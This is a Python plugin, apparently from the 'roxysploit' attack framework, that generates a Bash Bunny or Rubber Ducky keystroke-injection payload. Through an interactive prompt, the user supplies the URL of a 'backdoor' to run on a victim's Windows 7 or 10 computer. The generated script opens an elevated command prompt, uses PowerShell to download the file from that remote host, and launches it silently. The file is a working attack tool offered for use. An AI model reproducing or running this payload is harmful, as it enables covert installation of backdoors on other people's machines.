Description = 'Generate a nice and effective bash bunny or rubber ducky script'

import re
import sys
import string
import time
import random
import sys
import os
import logging
from lxml import etree
from urlparse import urlparse
from struct import pack

plugin_description = Description
intname = "rsf"
det = sys.argv[0]
dala = det.split('.')[-2]
fin = dala.split('plugins/')[-1]
__plugin__      = "%s.plugin" % (fin)
RescoursesDir = os.getcwd()
dandtime = time.strftime("%H:%M:%S")
logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

tree = etree.parse("storage/logs/config.xml")
for user in tree.xpath("/configuration/config/default_target"):
	ip = "%s" % (user.text)

def doit(anchor,savename):
    try:
        payloadfile = open("storage/logs/payload.txt","w")
        toedit= """
    ATTACKMODE HID
    LED B 200
    Q GUI r
    Q DELAY 500
    Q STRING cmd
    Q DELAY 500
    Q CTRL-SHIFT ENTER
    Q DELAY 2000
    Q STRING "powershell(new-object net.webclient).DownloadFile('%s','%s') ;"
    Q ENTER
    Q STRING "start /B %s ;"
    Q ENTER
    Q DELAY 100
    Q STIRNG "%s"
    Q ENTER
    LED CLEANUP
    Q STRING "exit"
    Q ENTER
    LED FINISH
    """ % (anchor,savename,savename,savename)
        payloadfile.write(toedit)
        payloadfile.close()
        print "\033[1;94m[!]\033[1;m  File writen to storage/logs/payload.txt"
        os.system("cat storage/logs/payload.txt")
        sys.exit()
    except Exception as e:
        print "[!] Something went wrong :( \n Please update roxysploit!"
        print e
        sys.exit()

def dash():
    while True:
        line_1 = "" + intname + "(\033[1;31m" + fin + "\033[1;m) > "
        terminal = raw_input(line_1).lower()
        time.sleep(0.5)
        if terminal == 'help':
            print "\n"
            print "Core Commands"
            print "============="
            print ""
            print "  Command         Description"
            print "  -------         -----------"
            print "  help            show help menu"
            print "  execute         run the plugin"
            print "  exit            exit the current plugin"
            print "  info            show plugin description"
            print ""
        elif terminal == 'execute':
            aner()
        elif terminal == "info":
            print plugin_description
            dash()
        elif terminal == 'exit':
            exit()
        else:
            print "Unknown syntax: %s" % (terminal)

def aner():
    defurl = "https://google.com/lulz.ps"
    ifno = "backdoor.ps"
    time.sleep(0.2)
    print "\033[1;94m[?]\033[1;m URL :: Give a url of the backdoor you want to execute on the victims Windows 7 or 10 computer"
    url = raw_input('\033[1;92m[+]\033[1;m url: [' + defurl + ']: ') or defurl
    print "\033[1;94m[?]\033[1;m URL :: What do you want the filename to be saved as"
    fielname = raw_input('\033[1;92m[+]\033[1;m name: [' + ifno + ']: ') or ifno
    yen = "yes"
    et = "yes"
    print "\033[1;94m[?]\033[1;m Configuring Plugin"
    time.sleep(1)
    print ""
    print "Name             Set Value"
    print "----             ----------"
    print "Backdoor         %s" % (url)
    print "Filename         %s" % (fielname)
    print "Plugin           %s" % (fin)
    print "\n"
    et = raw_input("\033[1;94m[?]\033[1;m Execute Plugins? [" + yen + "]: ")  or yen
    if et == 'yes':
        doit(url,fielname)
    elif et == 'no':
        print "Goodbye ;("
        sys.exit()
    else:
        print "\033[1;92m[!] No options were chosen.\033[1;m"


dash()
